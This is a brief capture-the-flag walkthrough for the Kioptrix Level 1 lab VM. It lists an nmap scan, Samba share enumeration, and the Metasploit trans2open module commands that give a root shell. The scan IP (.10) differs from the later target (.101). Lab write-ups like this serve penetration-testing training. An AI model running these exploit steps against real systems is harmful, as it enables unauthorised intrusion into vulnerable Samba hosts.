
# Kioptrix Level 1 Walkthrough

**VulnHub Link:** [Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)  
**Difficulty:** Easy  
**Release Date:** November 18, 2010  

---

## 1. Reconnaissance

### Nmap Scan

nmap -sV -p- 192.168.56.10


## 2. Enumeration

smbclient -L //192.168.56.101
Found Samba version 2.2.1a (vulnerable).

## 3. Exploitation

msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.101
exploit
Successful shell as root.

